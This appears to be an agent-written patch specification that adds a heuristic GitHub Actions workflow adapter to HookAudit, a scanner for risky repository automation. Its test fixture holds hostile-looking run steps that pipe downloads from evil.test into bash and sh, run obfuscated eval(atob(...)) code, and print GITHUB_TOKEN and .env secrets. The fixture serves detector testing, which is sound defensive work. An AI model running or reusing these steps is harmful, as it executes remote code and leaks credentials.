# HookAudit GitHub Actions Adapter — Patch Spec (merge-ready, zero-dep)

**Repo:** `C:\Hackathons\HookAudit` · **File:** `bin/hookaudit.js` (single-file, zero-dep)  
**Spec scope:** Add SURFACES[12] `github-workflows` — heuristic YAML adapter  
**Constraint:** Do NOT modify `bin/hookaudit.js` directly in this PR; this doc is the exact patch for main agent to apply without conflict.  
**Zero-dep invariant:** No `yaml` package, no new `node:` imports, no `child_process`/`vm`/`fetch` at runtime. Uses existing `RULES`, `CAPABILITY`, `evaluateCommand`, `computePathRisk`, `createEvidence`, `resolveInsideRepository`.

---

## 0. Verification vs current docs (required note)

| Fact | Verified | Source |
|------|----------|--------|
| Location | `.github/workflows/*.yml` and `*.yaml` | GitHub Docs: *Workflow syntax for GitHub Actions* — "Workflows are defined in `.github/workflows`" |
| Trigger semantics | `on:` field defines triggers: `push`, `pull_request`, `workflow_dispatch`, `schedule`, `workflow_call`, `repository_dispatch` | GitHub Docs `on:` — string, array, or map form; examples `on: [push, pull_request]`, `on: push`, `on: workflow_dispatch` |
| Automatic execution | `push` / `pull_request` / `schedule` fire automatically without separate approval (repo push/PR/scheduled run) | Same docs + observable behavior |
| Execution context | GitHub-hosted (ephemeral VM) but **repository-controlled config** — attacker who can commit to `.github/workflows/` controls what runs on `push`/PR, including secret exfiltration | MITRE/ChainDrop literature: repo-controlled automation is the trust boundary HookAudit audits (see `LIMITATIONS.md:6 Unsupported Ecosystems` — CI systems listed as future adapter, not MVP blocker) |
| Heuristic status | No stdlib YAML parser (`STDLIB.md` confirms no YAML reader) → parse as **raw text heuristic** via regex; document limitation honestly | `LIMITATIONS.md:2` already documents TOML/YAML raw-text treatment for `.codex/config.toml` / `.pre-commit-config.yaml` |

**Conclusion:** Adapter is `yaml-dir`/`text-dir` heuristic. Finding text: *"GitHub Actions workflow (heuristic — raw-text YAML scan, no YAML AST)"* in human report. Evidence includes `field: jobs.<job>.steps[i].run`.

---

## 1. Why GitHub Actions is the strongest well-defined candidate (per §33 / SPEC §5, §38, RULES §6)

RULES §6 *Product Scope* and SPEC §5 *Future Ecosystems* list CI systems as adapter candidates only ("Do not add extra ecosystems before core graph is stable"). Among candidates (GitHub Copilot, Windsurf, additional IDEs, other task runners, CI), GitHub Actions is the **strongest** because it is the only one with **all** of:

1. **Single canonical committed location** — `.github/workflows/*.yml/*.yaml` (vs Copilot/Windsurf which have user-global, editor-version-dependent, or undocumented local config; no stable committed trigger).
2. **Codified trigger field `on:`** — enumerates automatic vs manual with clear semantics (`push`/`pull_request`/`schedule` = automatic; `workflow_dispatch`/`workflow_call`/`repository_dispatch` = manual/webhook) — maps directly to HookAudit's `AUTO_TRIGGER_KEYS` / `autoHint` and unified path risk table (`automatic+network+process → HIGH`).
3. **Repository-controlled execution** — committed YAML controls what executes on GitHub's runners; fits HookAudit's product promise *"What can this repository cause to execute, through which trigger, with which reachable capabilities"* even though execution is remote — consistent with existing `.husky` / `.git/hooks` which also execute outside the scanner but are audited because the repo controls the trigger definition.
4. **Zero-dep feasible** — raw-text `run:` extraction via regex `/run:\s*\|?\s*(.+)/g` plus block-scalar handling; no YAML AST required (same honest approach as `.codex/config.toml` raw-text heuristic, documented in `LIMITATIONS.md:2`).
5. **High value / known abuse** — workflows can exfiltrate `secrets.GITHUB_TOKEN`, download remote payloads, bootstrap runtimes; matches existing P0/P1 capabilities (`REMOTE_DOWNLOAD`, `NETWORK_ACCESS`, `RUNTIME_BOOTSTRAP`, `CREDENTIAL_ACCESS_SIGNAL`) without needing a separate risk engine.
6. **Preserves architecture** — adapter normalizes to `ExecutionSurface` → `Trigger`/`CommandSpec` → `RULES` → `computePathRisk`; does **not** own risk (per PLAN §7 / RULES §8 *"Adapters must not contain their own independent risk engines"*). Reuses deterministic evidence/confidence/risk pipeline.

Other candidates (Copilot, Windsurf, generic MCP configs) lack a committed file location or documented automatic trigger semantics and would require speculative parsing or risk owning a new risk model — correctly CUT per §44 *Cut Order*.

---

## 2. Patch Overview — Files to touch

- `bin/hookaudit.js:62-74` — `SURFACES` array (add 12th entry)
- `bin/hookaudit.js:400-410` — `SURFACE_DIRS` already contains `'.github'` (no change needed; cross-tool linking will detect `node .claude/...` inside workflow)
- `bin/hookaudit.js:401-520` — add helper functions `parseGithubTriggers`, `extractGithubWorkflowCommands` (pure regex, zero-dep) before `scanFile`
- `bin/hookaudit.js:521-597` — `scanFile(root, surface, file, globalDiagnostics)` — add `else if (surface.id === 'github-workflows')` branch
- `bin/hookaudit.js:494-519` — `resolveSurfaceFiles` — add `.yml/.yaml` filter for `github-workflows` (optional but recommended)
- `test/fixtures/github-actions-repo/.github/workflows/ci.yml` — new fixture (created separately, inert)

---

## 3. Exact Patch — 3.A SURFACES entry

**Location:** `bin/hookaudit.js:62-74`  
**Current (11 surfaces):**

```js
const SURFACES = [
  { id: 'claude-settings', glob: ['.claude/settings.json', '.claude/settings.local.json'], kind: 'json', describe: 'Claude Code project hook configuration' },
  { id: 'claude-mcp', glob: ['.mcp.json', '.claude/mcp.json'], kind: 'json', describe: 'MCP server launch configuration read by Claude Code' },
  { id: 'vscode-tasks', glob: ['.vscode/tasks.json'], kind: 'json', describe: 'VS Code task configuration (can auto-run on folder open)' },
  { id: 'vscode-settings', glob: ['.vscode/settings.json'], kind: 'json', describe: 'VS Code workspace settings (can enable task auto-run)' },
  { id: 'cursor-rules', glob: ['.cursorrules', '.cursor/rules'], kind: 'text-dir-or-file', describe: 'Cursor agent rule files' },
  { id: 'gemini-settings', glob: ['.gemini/settings.json'], kind: 'json', describe: 'Gemini CLI project hook configuration' },
  { id: 'codex-config', glob: ['.codex/config.toml'], kind: 'text', describe: 'Codex CLI configuration (heuristic)' },
  { id: 'package-lifecycle', glob: ['package.json'], kind: 'json', describe: 'npm lifecycle scripts' },
  { id: 'husky-hooks', glob: ['.husky'], kind: 'text-dir', describe: 'Husky-managed git hook scripts' },
  { id: 'git-hooks', glob: ['.git/hooks'], kind: 'text-dir', describe: 'Local git hook scripts (excluding *.sample)' },
  { id: 'precommit-config', glob: ['.pre-commit-config.yaml', '.pre-commit-config.yml'], kind: 'text', describe: 'pre-commit framework configuration' },
];
```

**After (12 surfaces) — insert as last entry before `];`:**

```js
const SURFACES = [
  { id: 'claude-settings', glob: ['.claude/settings.json', '.claude/settings.local.json'], kind: 'json', describe: 'Claude Code project hook configuration' },
  { id: 'claude-mcp', glob: ['.mcp.json', '.claude/mcp.json'], kind: 'json', describe: 'MCP server launch configuration read by Claude Code' },
  { id: 'vscode-tasks', glob: ['.vscode/tasks.json'], kind: 'json', describe: 'VS Code task configuration (can auto-run on folder open)' },
  { id: 'vscode-settings', glob: ['.vscode/settings.json'], kind: 'json', describe: 'VS Code workspace settings (can enable task auto-run)' },
  { id: 'cursor-rules', glob: ['.cursorrules', '.cursor/rules'], kind: 'text-dir-or-file', describe: 'Cursor agent rule files' },
  { id: 'gemini-settings', glob: ['.gemini/settings.json'], kind: 'json', describe: 'Gemini CLI project hook configuration' },
  { id: 'codex-config', glob: ['.codex/config.toml'], kind: 'text', describe: 'Codex CLI configuration (heuristic)' },
  { id: 'package-lifecycle', glob: ['package.json'], kind: 'json', describe: 'npm lifecycle scripts' },
  { id: 'husky-hooks', glob: ['.husky'], kind: 'text-dir', describe: 'Husky-managed git hook scripts' },
  { id: 'git-hooks', glob: ['.git/hooks'], kind: 'text-dir', describe: 'Local git hook scripts (excluding *.sample)' },
  { id: 'precommit-config', glob: ['.pre-commit-config.yaml', '.pre-commit-config.yml'], kind: 'text', describe: 'pre-commit framework configuration' },
  { id: 'github-workflows', glob: ['.github/workflows'], kind: 'yaml-dir', describe: 'GitHub Actions workflows (on push/PR, run: commands) — heuristic raw-text YAML' },
];
```

**Alternative kind:** `'text-dir'` is acceptable (both fall into non-json branch); `'yaml-dir'` is preferred because it self-documents heuristic YAML and mirrors `precommit-config`'s `kind: 'text'` honesty.

---

## 4. Exact Patch — 3.B Helper functions (insert before `scanFile`)

**Location:** Insert immediately before `function scanFile(root, surface, file, globalDiagnostics)` at `bin/hookaudit.js:521` (right after `resolveSurfaceFiles`). No new imports.

```js
// ---------------------------------------------------------------
// GitHub Actions adapter — heuristic YAML (zero-dep, no yaml lib)
// ---------------------------------------------------------------
const GITHUB_KNOWN_TRIGGERS = ['push', 'pull_request', 'workflow_dispatch', 'schedule', 'workflow_call', 'repository_dispatch'];
const GITHUB_AUTO_TRIGGERS = new Set(['push', 'pull_request', 'schedule']);

function parseGithubTriggers(text) {
  // Heuristic: find the `on:` field and check which known triggers appear nearby.
  // Supports:
  //   on: push
  //   on: [push, pull_request]
  //   on:
  //     push:
  //     pull_request:
  //     workflow_dispatch:
  //     schedule:
  // This is raw-text heuristic — NOT a YAML AST (documented in LIMITATIONS extension).
  const onLineMatch = text.match(/^\s*on\s*:\s*(.*)$/m);
  const triggers = [];
  if (!onLineMatch) return triggers;
  const start = onLineMatch.index;
  // Take window after `on:` and strip comment lines (heuristic: ignore lines where first non-space char is '#')
  const rawWindow = text.slice(start, start + 1200);
  const filteredWindow = rawWindow.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n').toLowerCase();
  for (const t of GITHUB_KNOWN_TRIGGERS) {
    const re = new RegExp('(^|[^a-z0-9_])' + t.replace('_', '_') + '([^a-z0-9_]|$)', 'i');
    if (re.test(filteredWindow)) triggers.push(t);
  }
  // Deduplicate preserving order defined in GITHUB_KNOWN_TRIGGERS
  return [...new Set(triggers)];
}

function extractGithubWorkflowCommands(content) {
  // Extracts { trigger, command, field, autoHint } per `run:` occurrence.
  // Field is `jobs.<job>.steps[i].run` when determinable, else `steps[i].run` / `run[i]`.
  // Trigger is the workflow trigger (e.g., 'push') or 'workflow:job' fallback.
  // `autoHint` = true if workflow contains automatic trigger (push/pull_request/schedule).

  const triggers = parseGithubTriggers(content);
  const isAutoWorkflow = triggers.some((t) => GITHUB_AUTO_TRIGGERS.has(t));
  const workflowTrigger = triggers.length ? triggers.join(',') : 'workflow';

  const lines = content.split('\n');
  const results = [];

  // Track current job name for field construction
  let currentJob = null;
  let stepIndex = -1;
  let inJobs = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    // Detect `jobs:` start
    if (/^\s*jobs\s*:\s*$/.test(line)) { inJobs = true; continue; }
    // Detect job name: exactly 2-space indent under `jobs:` (heuristic)
    // e.g., "  build:" or "  malicious-chain:"
    if (inJobs) {
      const jobMatch = line.match(/^\s{2}([A-Za-z0-9_\-]+)\s*:\s*$/);
      if (jobMatch) {
        const candidate = jobMatch[1];
        // Filter out known non-job keys that also appear at 2-indent in other contexts
        if (!['steps', 'runs-on', 'needs', 'strategy', 'env', 'if', 'permissions'].includes(candidate)) {
          currentJob = candidate;
          stepIndex = -1;
          continue;
        }
      }
      // Detect step boundary — increment when we see `- name:` or `- uses:` or `- run:`
      if (/^\s*-\s*(name|uses|run)\s*:/.test(line)) {
        // Only increment on first token of step; `- name:` and following `run:` belong to same step
        if (/^\s*-\s*name\s*:/.test(line) || /^\s*-\s*uses\s*:/.test(line)) {
          // Next `run:` will be same step; mark pending increment
          // Actually increment stepIndex here and reuse for subsequent run:
          stepIndex++;
        } else if (/^\s*-\s*run\s*:/.test(line)) {
          // Step without preceding `name:` — still a new step
          stepIndex++;
        }
      }
    }

    const runMatch = line.match(/^\s*(?:-\s*)?run\s*:\s*(\|?-?)\s*(.*)$/);
    if (!runMatch) continue;

    const pipe = runMatch[1]; // '|' or '|-', or ''
    const inline = (runMatch[2] || '').trim();

    let command = '';
    let field = '';

    if (pipe && pipe.startsWith('|')) {
      // Block scalar: collect following indented lines (6+ spaces or 4+ relative to `run:`)
      const blockLines = [];
      let j = i + 1;
      while (j < lines.length) {
        const nl = lines[j];
        // Block lines are indented at least 6 spaces (or 8 in deeply nested) OR empty
        if (nl.trim() === '') { blockLines.push(''); j++; continue; }
        if (/^\s{6,}\S/.test(nl) || /^\s*\t/.test(nl)) { blockLines.push(nl.trim()); j++; }
        else break;
      }
      command = (inline ? inline + '\n' : '') + blockLines.join('\n');
      command = command.trim();
      // Advance i to last consumed line for outer loop
      // (keep i at current line; outer loop will step through block lines but they won't match `run:`)
    } else {
      command = inline;
      // Handle inline quoted or trailing comment: strip ` # comment` if not inside quotes
      // Keep as-is for detector — RULES regex handles it; do not over-strip.
    }

    if (!command) continue;

    // Build field like `jobs.<job>.steps[i].run`
    if (currentJob) field = `jobs.${currentJob}.steps[${Math.max(0, stepIndex)}].run`;
    else field = `steps[${results.length}].run`;

    // Trigger label: prefer workflow trigger, but qualify with job for graph clarity
    const trigger = currentJob ? `${workflowTrigger}:${currentJob}` : workflowTrigger;

    results.push({ trigger, command, field, auto: isAutoWorkflow });
  }

  // Fallback: if no structured steps found but `run:` appears (e.g., unusual indent), regex sweep
  if (results.length === 0) {
    const re = /run\s*:\s*\|?\s*([^\n]+)/g;
    let m;
    let idx = 0;
    while ((m = re.exec(content)) !== null) {
      const cmd = (m[1] || '').trim();
      if (!cmd || cmd === '|') continue;
      // Skip `uses:` false positives already handled — `run:` is distinct
      results.push({ trigger: workflowTrigger, command: cmd, field: `run[${idx}].run`, auto: isAutoWorkflow });
      idx++;
    }
  }

  return results;
}
```

**Notes:**
- Pure regex, no YAML dependency.
- Handles `run: npm test`, `run: curl ... | bash`, `run: |` block scalar (multi-line `wget ... | sh`).
- `auto` is `true` iff `on:` contains `push`/`pull_request`/`schedule` — drives `evaluateCommand(..., autoHint, ...)` which adds `score +=2` for auto and feeds `computePathRisk` (`automatic+network+process → HIGH`, `automatic+remote+process+obfuscation → CRITICAL`).
- `trigger` values like `push:build` or `push,pull_request:malicious-chain` preserve workflow→job traceability in `ExecutionPath.chain` and human report (`trigger="push"`).

---

## 5. Exact Patch — 3.C `resolveSurfaceFiles` filter (optional but recommended)

**Location:** `bin/hookaudit.js:495-519` inside `resolveSurfaceFiles` `if (isDir)` branch, after `for (const f of listFilesRecursive(...))`:

```js
// Existing:
    if (isDir) {
      for (const f of listFilesRecursive(abs, root, diagnostics)) {
        if (surface.id === 'git-hooks' && f.endsWith('.sample')) continue;
        found.push(f);
      }
```

**Patch to:**

```js
    if (isDir) {
      for (const f of listFilesRecursive(abs, root, diagnostics)) {
        if (surface.id === 'git-hooks' && f.endsWith('.sample')) continue;
        if (surface.id === 'github-workflows' && !/\.ya?ml$/i.test(f)) continue;
        found.push(f);
      }
```

---

## 6. Exact Patch — 3.D `scanFile` adapter branch

**Location:** `bin/hookaudit.js:521-597` (`function scanFile(...)`).  
**Current structure** (simplified):

```js
function scanFile(root, surface, file, globalDiagnostics) {
  // ... guards, hash ...
  let findings = [];
  if (surface.kind === 'json') {
    // ... json handling + sweep
  } else {
    const auto = surface.id === 'git-hooks' || surface.id === 'husky-hooks';
    findings.push(...evaluateCommand(ownDir, path.basename(file), content, auto, rel, null));
  }
  // ... dedup, sort, capabilities
}
```

**Patch — replace `else` block with branched handling; keep json branch untouched:**

```js
function scanFile(root, surface, file, globalDiagnostics) {
  const rawRel = path.relative(root, file);
  const rel = toPosix(rawRel);
  const ownDir = surface.glob.find((g) => rel.startsWith(g.split('/')[0]))?.split('/')[0] || ('.' + rel.split('/')[0]);
  const localDiags = [];

  const guard = readTextSafeWithGuards(file, rel, globalDiagnostics);
  if (guard.content === null) {
    const diagCode = guard.diagnostic;
    if (diagCode === DIAGNOSTIC_CODES.FILE_TOO_LARGE || diagCode === DIAGNOSTIC_CODES.BINARY_SKIPPED || diagCode === DIAGNOSTIC_CODES.SYMLINK_SKIPPED) {
      return { file: rel, surface: surface.id, hash: null, findings: [], parseError: null, diagnostics: [{ code: diagCode, path: rel }], capabilities: [] };
    }
    if (guard.diagnostic === 'unreadable') {
      return { file: rel, surface: surface.id, hash: null, findings: [], parseError: 'unreadable', diagnostics: [{ code: DIAGNOSTIC_CODES.PERMISSION_DENIED, path: rel }], capabilities: [] };
    }
    return { file: rel, surface: surface.id, hash: null, findings: [], parseError: guard.diagnostic, diagnostics: [], capabilities: [] };
  }
  const content = guard.content;
  const hash = sha256(content);
  let findings = [];
  let parseError = null;
  let diagnostics = [];

  if (surface.kind === 'json') {
    // ... UNCHANGED — keep existing JSON handling (claude-settings, vscode-tasks, etc.) ...
    // (do not edit this branch; preserve defense-in-depth sweep logic)
  } else if (surface.id === 'github-workflows') {
    // GitHub Actions heuristic adapter — reuses shared RULES/risk engine
    const cmds = extractGithubWorkflowCommands(content);
    for (const c of cmds) {
      // ownDir '.github' enables CROSS_TOOL_LINK when command refs `.claude/` etc.
      findings.push(...evaluateCommand('.github', c.trigger, c.command, c.auto, rel, c.field));
    }
    // Defense-in-depth whole-file sweep: catch `curl|bash` outside `run:` (e.g., in `uses:` comments)
    // Only retain sweep if it adds new capability not already covered (same pattern as json branch)
    const sweepFindings = evaluateCommand('.github', 'file-body', content, false, rel, null);
    if (sweepFindings.length) {
      const existingCaps = new Set(findings.flatMap((f) => f.capabilities));
      const newCaps = sweepFindings.flatMap((f) => f.capabilities).filter((c) => !existingCaps.has(c));
      if (newCaps.length > 0) findings.push(...sweepFindings);
      else if (findings.length === 0) findings.push(...sweepFindings);
    }
    // Diagnostic for heuristic nature (informational, not a finding)
    if (cmds.length === 0 && content.trim().length > 0) {
      diagnostics.push({ code: DIAGNOSTIC_CODES.UNSUPPORTED_FORMAT, path: rel, detail: 'No run: commands extracted — heuristic YAML scan (no YAML AST)' });
    }
  } else {
    const auto = surface.id === 'git-hooks' || surface.id === 'husky-hooks';
    findings.push(...evaluateCommand(ownDir, path.basename(file), content, auto, rel, null));
  }

  // De-duplicate generic file-body if specific already covers
  findings = findings.filter((f, i, arr) => !(f.trigger === 'file-body' && arr.some((o) => o !== f && o.severity === f.severity && o.capabilities.some((c) => f.capabilities.includes(c)))));

  const order = { CRITICAL: 0, WARN: 1, INFO: 2 };
  findings.sort((a, b) => (order[a.severity] - order[b.severity]) || a.trigger.localeCompare(b.trigger) || a.command.localeCompare(b.command));

  const fileCaps = [...new Set(findings.flatMap((f) => f.capabilities))].sort();

  return { file: rel, surface: surface.id, hash, findings, parseError, diagnostics, capabilities: fileCaps };
}
```

**Key invariant:** Adapter calls `evaluateCommand` — the **same** `RULES`, `capabilities`, `evidence`, `confidence` (`computeConfidence`), and `computePathRisk` as other adapters. No separate risk engine.

**Evidence per finding:**
- `path`: `.github/workflows/ci.yml`
- `field`: `jobs.build.steps[1].run` etc.
- `detector`: `remote-download`, `obfuscation`, `network-fetch`, etc. (from `RULES`)
- `excerpt`: raw `run:` command slice (≤200 chars via `createEvidence`)
- `trigger`: workflow triggers (`push`, `push,pull_request`, `push:build`)

**Risk derivation:** `evaluateCommand` adds `score +=2` if `auto=true` (push/PR/schedule), then `RULES` weights. `resolveExecutionGraph` later aggregates `pathRisk` via `computePathRisk(capabilities, isAuto, confidence)` — same table for all surfaces:
- `automatic + REMOTE_DOWNLOAD + PROCESS_EXECUTION + OBFUSCATION → CRITICAL`
- `automatic + REMOTE_DOWNLOAD + PROCESS_EXECUTION → CRITICAL`
- `automatic + NETWORK + PROCESS → HIGH`

---

## 7. Fixture Content

**Path:** `C:\Hackathons\HookAudit\test\fixtures\github-actions-repo\.github\workflows\ci.yml`  
**Created by this patch spec** (inert, never executed by scanner — scanner uses `readFileSync` + regex only):

```yaml
# GitHub Actions workflow — HookAudit fixture (synthetic inert, never executed)
# Contains: legitimate job (npm test) + high-risk job (curl|bash, wget|sh, atob/eval)
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: '0 2 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install deps
        run: npm ci
      - name: Run tests (legitimate)
        run: npm test
      - name: Lint
        run: npx eslint .
      - name: Inline node script (legit)
        run: node ./scripts/check.js

  malicious-chain:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch and execute remote payload (REMOTE_DOWNLOAD)
        run: curl -s https://evil.test/bootstrap.sh | bash
      - name: Obfuscated eval via atob (OBFUSCATION + DYNAMIC_EXECUTION)
        run: node -e "eval(atob('Y29uc29sZS5sb2coImhpamFjayIp'))"
      - name: Multi-line block scalar — wget pipe to sh
        run: |
          wget -qO- https://evil.test/payload | sh
          echo "done"
          chmod +x ./payload && ./payload
      - name: Cross-tool link (references .claude hook dir)
        run: node .claude/hooks/setup.js
      - name: Runtime bootstrap pattern
        run: curl -fsSL https://bun.sh/install | bash
      - name: Env/credential access signal
        run: echo $GITHUB_TOKEN && cat .env | grep SECRET
```

**Expected scan results (zero-dep proof):**

| Workflow job/step | Trigger | `run:` command | Expected RULES | Capabilities | `isAuto` | Severity/Risk |
|-------------------|---------|----------------|----------------|--------------|----------|---------------|
| `build` / `npm test` | `push,pull_request,schedule,workflow_dispatch` | `npm test` | none (or `process-exec` low) | `[]` or `[PROCESS_EXECUTION]` | true (push/PR) | `INFO`/`WARN` + pathRisk `MEDIUM` (auto alone) |
| `malicious-chain` / `curl | bash` | same | `remote-download` (weight 3) + `network-fetch` (2) | `REMOTE_DOWNLOAD, NETWORK_ACCESS, PROCESS_EXECUTION` | true | `CRITICAL` (auto+remote+process) |
| `…` / `atob eval` | same | `eval(atob('...'))` | `obfuscation` (2) | `OBFUSCATION, DYNAMIC_EXECUTION` | true | `HIGH` (auto+process+obf) or `MEDIUM` alone; combined with above → `CRITICAL` path |
| `…` / `wget | sh` block | same | `remote-download` + `network-fetch` | `REMOTE_DOWNLOAD, NETWORK_ACCESS` | true | `CRITICAL` |
| `…` / `.claude/hooks` | same | `node .claude/hooks/setup.js` | `cross-reference` (+3) | `CROSS_TOOL_LINK, PROCESS_EXECUTION` | true | `HIGH` |

The combined workflow should yield at least **3 CRITICAL/WARN findings** and **2 HIGH/CRITICAL paths** in `hookaudit scan --json`, mirroring `malicious-repo` fixture behavior.

**Additional test matrix (optional second fixture):**

- `test/fixtures/github-actions-repo-legit/.github/workflows/ci.yml` — only the `build` job (legit) → expect 0 CRITICAL, exit 0 without `--strict`.
- Existing clean/malicious fixtures remain untouched; github-actions fixture is additive.

---

## 8. How to apply (main agent)

1. **Copy-paste 3.A** into `bin/hookaudit.js` at `62-74` (preserve trailing comma, deterministic sort).
2. **Paste 3.B** helper functions before `scanFile` (do not add new `require`).
3. **Apply 3.C** filter (one line).
4. **Replace `scanFile` `else` with 3.D** (or surgical insert of `else if (surface.id === 'github-workflows')` between json and generic text branches).
5. **Create fixture** at `test/fixtures/github-actions-repo/.github/workflows/ci.yml` (content above).
6. **Verify:**
   ```bash
   node bin/hookaudit.js scan --path test/fixtures/github-actions-repo --json | jq '.results[].file, .results[].findings[].severity'
   # expect .github/workflows/ci.yml with CRITICAL
   node bin/hookaudit.js scan --path test/fixtures/github-actions-repo --json | jq '.paths[] | select(.risk=="CRITICAL") | .trigger'
   npm test   # existing 22 tests must stay green
   npm ls --all  # must still be (empty)
   ```

---

## 9. Documentation / Honesty updates (follow-up, not required for merge)

- Append to `LIMITATIONS.md:2`:
  > **GitHub Actions** (`.github/workflows/*.yml`): scanned as **raw-text heuristic** (regex for `on:` and `run:`), no YAML AST. Triggers `push`/`pull_request`/`schedule` are treated as automatic. Execution is GitHub-hosted but the workflow definition is repository-controlled, so it is in-scope. Multi-line `run: |` is joined heuristically; complex YAML anchors/aliases or `uses:`-only steps are not resolved as code execution (out of scope).
- Append to `README.md` supported surfaces list: add `GitHub Actions (.github/workflows)` with note *"heuristic — raw-text scan"*.
- Append to `STDLIB.md`: note that YAML parsing is intentionally avoided (zero-dep, `node:` has no YAML reader) and heuristic regex is the trade-off.

---

## 10. Security / determinism checklist

- [x] No new runtime dependency (`package.json` unchanged).
- [x] No `child_process`/`vm`/`fetch` introduced (grep for `require('node:child_process')` still only in test helper).
- [x] Still respects `MAX_FILE_SIZE`/`BINARY_CHECK_BYTES`/`lstat`/`SYMLINK_SKIPPED`/`BOUNDARY_VIOLATION` via `readTextSafeWithGuards`.
- [x] Deterministic ordering preserved (`findings.sort`, `results.sort`, `paths.sort`).
- [x] `resolveInsideRepository` unchanged; workflow `run:` refs that look like paths (e.g., `node .claude/hooks/setup.js`) will be resolved by `resolveExecutionGraph` as before (multi-hop `config→script`).
- [x] Fixture payloads are synthetic inert strings; never executed (proven by existing `never-execute` test pattern).

---

## 11. Alternatives considered (and rejected)

| Alternative | Why rejected |
|-------------|--------------|
| Add `yaml` npm package | Violates zero-dep (`RULES.md:4`, `.zero-dep.toml`) → DSQ |
| Separate risk engine for workflows | Violates PLAN §7 / RULES §8 — adapters must NOT own risk |
| Treat all `on:` as automatic | Over-flags `workflow_dispatch`/`workflow_call` (manual) — stick to `push`/`pull_request`/`schedule` as automatic |

---

**Patch author:** GitHub Actions adapter spec — ready for `main` to apply via 3 edits + 1 fixture creation. No conflict with existing 11-surface logic.
